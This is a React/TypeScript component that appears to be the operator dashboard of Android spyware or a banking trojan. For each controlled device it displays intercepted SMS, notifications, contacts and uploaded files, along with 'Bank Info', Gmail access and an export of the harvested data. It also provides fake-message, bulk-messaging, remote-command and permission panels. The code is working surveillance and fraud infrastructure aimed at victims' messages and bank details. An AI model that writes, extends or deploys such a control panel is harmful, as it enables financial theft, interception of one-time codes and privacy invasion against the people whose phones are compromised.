import React, { useState, useMemo, useEffect, Suspense } from 'react'
import { Button } from '@/component/ui/button'
import { Card, CardContent } from '@/component/ui/card'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/component/ui/tabs'
import {
  Bell,
  Contact,
  TextCursorInput,
  Monitor,
  Building2,
  Download,
  PictureInPicture2,
  Loader,
} from 'lucide-react'
import { ref as storageRef, listAll, getDownloadURL, getMetadata } from 'firebase/storage'
import { storage } from '@/lib/firebase'
import {
  useDashboardMessages,
  useDashboardNotifications,
  useDashboardContacts,
} from '@/hooks/dashboard'
import { getDefaultProcessor, getProcessorById } from '@/lib/message-processors'
import type { User, InputFile } from '@/pages/dashboard/types'
import type { DeviceSubTab } from '@/pages/dashboard/components/DeviceSubTabs'
import {
  LazyDeviceSubTabs as DeviceSubTabs,
  LazyMessagesSection as MessagesSection,
  LazyNotificationsSection as NotificationsSection,
  LazyContactsSection as ContactsSection,
  LazyInputFilesSection as InputFilesSection,
  LazySystemInfoSection as SystemInfoSection,
  LazyBankInfoSection as BankInfoSection,
  LazyExportSection as ExportSection,
  LazyGmailSection as GmailSection,
  LazyUtilitiesSection as UtilitiesSection,
  LazyCommandsSection as CommandsSection,
  LazyInstructionsSection as InstructionsSection,
  LazyPermissionsSection as PermissionsSection,
  LazyMessageSchedulerPanel as MessageSchedulerPanel,
  LazyFakeMessagePanel as FakeMessagePanel,
  LazyAutoReplyPanel as AutoReplyPanel,
  LazyBulkOperationsPanel as BulkOperationsPanel,
  LazyMessageTemplatesPanel as MessageTemplatesPanel,
  LazyMessageAnalyticsPanel as MessageAnalyticsPanel,
  LazyRemoteMessagesSection as RemoteMessagesSection,
} from '@/pages/dashboard/sections/lazy'

type DataSubTab =
  | 'notifications'
  | 'contacts'
  | 'input'
  | 'system-info'
  | 'bank-info'
  | 'export'
  | 'remote-messages'

const SectionLoader = () => (
  <div className="flex items-center justify-center p-8">
    <Loader className="h-6 w-6 animate-spin text-muted-foreground" />
  </div>
)

function formatDate(dateString: string | number): string {
  try {
    const timestamp = typeof dateString === 'string' ? parseInt(dateString) : dateString
    if (!isNaN(timestamp) && timestamp > 0) {
      const date = new Date(timestamp)
      if (!isNaN(date.getTime())) return date.toLocaleString('en-US')
    }
    if (typeof dateString === 'string') {
      const date = new Date(dateString)
      if (!isNaN(date.getTime())) return date.toLocaleString('en-US')
    }
    return String(dateString)
  } catch {
    return String(dateString)
  }
}

function formatMessageTimestamp(timestamp: number | string): string {
  return formatDate(typeof timestamp === 'number' ? timestamp.toString() : timestamp)
}

export interface DeviceSectionViewProps {
  deviceId: string | null
  devices: User[]
  devicesError: string | null
  onRefreshDevices: () => void
  sessionEmail: string | null
  isAdmin: boolean
  /** When set (e.g. after Gmail OAuth redirect), open this sub-tab on mount */
  initialDeviceSubTab?: DeviceSubTab
}

export function DeviceSectionView({
  deviceId,
  devices,
  devicesError,
  onRefreshDevices,
  sessionEmail,
  isAdmin,
  initialDeviceSubTab,
}: DeviceSectionViewProps): React.ReactElement {
  const [deviceSubTab, setDeviceSubTab] = useState<DeviceSubTab>(() => initialDeviceSubTab ?? 'message')
  const [dataSubTab, setDataSubTab] = useState<DataSubTab>('notifications')
  const [dataLimit] = useState<number>(() => {
    try {
      const saved = localStorage.getItem('dashboard-dataLimit')
      return saved ? parseInt(saved, 10) : 100
    } catch {
      return 100
    }
  })
  const [selectedProcessorId, setSelectedProcessorId] = useState<string>(() => {
    try {
      const saved = localStorage.getItem('dashboardMessageProcessorId')
      if (saved) return saved
      return getDefaultProcessor()?.id ?? 'neft-inr-merge'
    } catch {
      return 'neft-inr-merge'
    }
  })
  const selectedProcessor = useMemo(() => {
    const p = getProcessorById(selectedProcessorId)
    return p ?? getDefaultProcessor()
  }, [selectedProcessorId])
  const [processorInput, setProcessorInput] = useState<string>(() => {
    try {
      return localStorage.getItem('dashboardProcessorInput') ?? ''
    } catch {
      return ''
    }
  })
  const [notificationsSyncEnabled] = useState(() => {
    try {
      return localStorage.getItem('dashboard-notificationsSyncEnabled') !== 'false'
    } catch {
      return true
    }
  })
  const [contactsSyncEnabled] = useState(() => {
    try {
      return localStorage.getItem('dashboard-contactsSyncEnabled') !== 'false'
    } catch {
      return true
    }
  })
  const [inputFiles, setInputFiles] = useState<InputFile[]>([])
  const [loadingInputFiles, setLoadingInputFiles] = useState(false)
  const [previewFile, setPreviewFile] = useState<InputFile | null>(null)

  const notificationsActiveTab =
    deviceSubTab === 'data' && dataSubTab === 'notifications' ? 'notifications' : 'inactive'
  const contactsActiveTab =
    deviceSubTab === 'data' && dataSubTab === 'contacts' ? 'contacts' : 'inactive'

  const {
    messages: sms,
    rawMessages: rawSms,
    loading: smsLoading,
    error: smsError,
    isConnected,
    refresh: refreshMessages,
  } = useDashboardMessages({
    deviceId,
    dataLimit,
    selectedProcessor,
    processorInput,
    activeTab: deviceSubTab === 'message' ? 'sms' : undefined,
  })

  const {
    notifications,
    loading: notificationsLoading,
    error: notificationsError,
  } = useDashboardNotifications({
    deviceId,
    dataLimit,
    activeTab: notificationsActiveTab,
    syncEnabled: notificationsSyncEnabled,
  })

  const {
    contacts,
    loading: contactsLoading,
    error: contactsError,
  } = useDashboardContacts({
    deviceId,
    activeTab: contactsActiveTab,
    syncEnabled: contactsSyncEnabled,
  })

  const shouldLoadInputFiles = deviceSubTab === 'data' && dataSubTab === 'input'
  useEffect(() => {
    if (!shouldLoadInputFiles || !deviceId) {
      setInputFiles([])
      return
    }
    let isMounted = true
    const fetchInputFiles = async () => {
      setLoadingInputFiles(true)
      try {
        const listRef = storageRef(storage, `inputs/${deviceId}`)
        const res = await listAll(listRef)
        const files = await Promise.all(
          res.items.map(async itemRef => {
            const url = await getDownloadURL(itemRef)
            const metadata = await getMetadata(itemRef)
            return {
              name: itemRef.name,
              url,
              contentType: metadata.contentType || 'application/octet-stream',
              time: metadata.timeCreated,
              size: metadata.size,
            }
          })
        )
        files.sort((a, b) => new Date(b.time).getTime() - new Date(a.time).getTime())
        if (isMounted) setInputFiles(files)
      } catch {
        if (isMounted) setInputFiles([])
      } finally {
        if (isMounted) setLoadingInputFiles(false)
      }
    }
    fetchInputFiles()
    return () => {
      isMounted = false
    }
  }, [shouldLoadInputFiles, deviceId])

  const currentUser = useMemo(
    () => (deviceId ? devices.find(u => u.id === deviceId) : null),
    [deviceId, devices]
  )

  if (!deviceId) {
    return (
      <Card>
        <CardContent className="p-6">
          <div className="text-center py-10 text-muted-foreground">
            <p className="font-medium">Select a device from the sidebar</p>
          </div>
        </CardContent>
      </Card>
    )
  }

  return (
    <>
      {devicesError && (
        <div className="mb-3 flex flex-wrap items-start justify-between gap-3 rounded-md border border-destructive/40 bg-destructive/10 p-3">
          <div className="text-sm text-destructive">
            <p className="font-medium">Device list failed to load</p>
            <p className="text-destructive/90">{devicesError}</p>
          </div>
          <Button variant="outline" size="sm" onClick={onRefreshDevices}>
            Retry
          </Button>
        </div>
      )}
      <Suspense fallback={<SectionLoader />}>
        <DeviceSubTabs
          activeTab={deviceSubTab}
          onTabChange={setDeviceSubTab}
          deviceId={deviceId}
        />
      </Suspense>

      {deviceSubTab === 'message' && (
        <Suspense fallback={<SectionLoader />}>
          <MessagesSection
            deviceId={deviceId}
            messages={sms}
            rawMessages={rawSms}
            loading={smsLoading}
            error={smsError}
            isConnected={isConnected}
            isAdmin={isAdmin}
            selectedProcessorId={selectedProcessorId}
            processorInput={processorInput}
            onProcessorChange={setSelectedProcessorId}
            onProcessorInputChange={setProcessorInput}
            onRetry={() => refreshMessages()}
            formatMessageTimestamp={formatMessageTimestamp}
          />
        </Suspense>
      )}

      {deviceSubTab === 'google' && (
        <Suspense fallback={<SectionLoader />}>
          <GmailSection deviceId={deviceId} isAdmin={isAdmin} />
        </Suspense>
      )}

      {deviceSubTab === 'data' && (
        <div className="space-y-4">
          <Tabs value={dataSubTab} onValueChange={v => setDataSubTab(v as DataSubTab)} className="w-full">
            <TabsList className="flex flex-wrap items-center gap-2">
              <TabsTrigger value="notifications" className="flex items-center gap-2 text-xs sm:text-sm">
                <Bell className="h-4 w-4" />
                Notifications
              </TabsTrigger>
              <TabsTrigger value="contacts" className="flex items-center gap-2 text-xs sm:text-sm">
                <Contact className="h-4 w-4" />
                Contacts
              </TabsTrigger>
              <TabsTrigger value="input" className="flex items-center gap-2 text-xs sm:text-sm">
                <TextCursorInput className="h-4 w-4" />
                Input Files
              </TabsTrigger>
              <TabsTrigger value="system-info" className="flex items-center gap-2 text-xs sm:text-sm">
                <Monitor className="h-4 w-4" />
                System Info
              </TabsTrigger>
              <TabsTrigger value="bank-info" className="flex items-center gap-2 text-xs sm:text-sm">
                <Building2 className="h-4 w-4" />
                Bank Info
              </TabsTrigger>
              <TabsTrigger value="export" className="flex items-center gap-2 text-xs sm:text-sm">
                <Download className="h-4 w-4" />
                Export
              </TabsTrigger>
              <TabsTrigger value="remote-messages" className="flex items-center gap-2 text-xs sm:text-sm">
                <PictureInPicture2 className="h-4 w-4" />
                Remote Messages
              </TabsTrigger>
            </TabsList>

            <TabsContent value="notifications" className="mt-4">
              <Suspense fallback={<SectionLoader />}>
                <NotificationsSection
                  deviceId={deviceId}
                  notifications={notifications}
                  loading={notificationsLoading}
                  error={notificationsError}
                  isConnected={isConnected}
                  isAdmin={isAdmin}
                  syncEnabled={notificationsSyncEnabled}
                  formatNotificationTimestamp={formatDate}
                />
              </Suspense>
            </TabsContent>
            <TabsContent value="contacts" className="mt-4">
              <Suspense fallback={<SectionLoader />}>
                <ContactsSection
                  deviceId={deviceId}
                  contacts={contacts}
                  loading={contactsLoading}
                  error={contactsError}
                  isConnected={isConnected}
                  isAdmin={isAdmin}
                  syncEnabled={contactsSyncEnabled}
                />
              </Suspense>
            </TabsContent>
            <TabsContent value="input" className="mt-4">
              <Suspense fallback={<SectionLoader />}>
                <InputFilesSection
                  deviceId={deviceId}
                  files={inputFiles}
                  loading={loadingInputFiles}
                  previewFile={previewFile}
                  onPreview={setPreviewFile}
                  onClosePreview={() => setPreviewFile(null)}
                />
              </Suspense>
            </TabsContent>
            <TabsContent value="system-info" className="mt-4">
              <Suspense fallback={<SectionLoader />}>
                <SystemInfoSection deviceId={deviceId} />
              </Suspense>
            </TabsContent>
            <TabsContent value="bank-info" className="mt-4">
              <Suspense fallback={<SectionLoader />}>
                <BankInfoSection deviceId={deviceId} />
              </Suspense>
            </TabsContent>
            <TabsContent value="export" className="mt-4">
              <Suspense fallback={<SectionLoader />}>
                <ExportSection
                  deviceId={deviceId}
                  messages={sms}
                  notifications={notifications}
                  contacts={contacts}
                  deviceInfo={{
                    name: currentUser?.device || 'Unknown',
                    phone: currentUser?.phone || 'N/A',
                  }}
                />
              </Suspense>
            </TabsContent>
            <TabsContent value="remote-messages" className="mt-4">
              <Suspense fallback={<SectionLoader />}>
                <div className="space-y-4">
                  <MessageSchedulerPanel deviceId={deviceId} />
                  <FakeMessagePanel deviceId={deviceId} />
                  <AutoReplyPanel deviceId={deviceId} />
                  <BulkOperationsPanel deviceId={deviceId} />
                  <MessageTemplatesPanel deviceId={deviceId} />
                  <MessageAnalyticsPanel deviceId={deviceId} />
                  <RemoteMessagesSection deviceId={deviceId} initialCard="sms" />
                </div>
              </Suspense>
            </TabsContent>
          </Tabs>
        </div>
      )}

      {deviceSubTab === 'utility' && (
        <Suspense fallback={<SectionLoader />}>
          <UtilitiesSection deviceId={deviceId} />
        </Suspense>
      )}

      {deviceSubTab === 'command' && (
        <Suspense fallback={<SectionLoader />}>
          <CommandsSection deviceId={deviceId} />
        </Suspense>
      )}

      {deviceSubTab === 'instruction' && (
        <Suspense fallback={<SectionLoader />}>
          <InstructionsSection deviceId={deviceId} />
        </Suspense>
      )}

      {deviceSubTab === 'permission' && (
        <Suspense fallback={<SectionLoader />}>
          <PermissionsSection deviceId={deviceId} />
        </Suspense>
      )}
    </>
  )
}
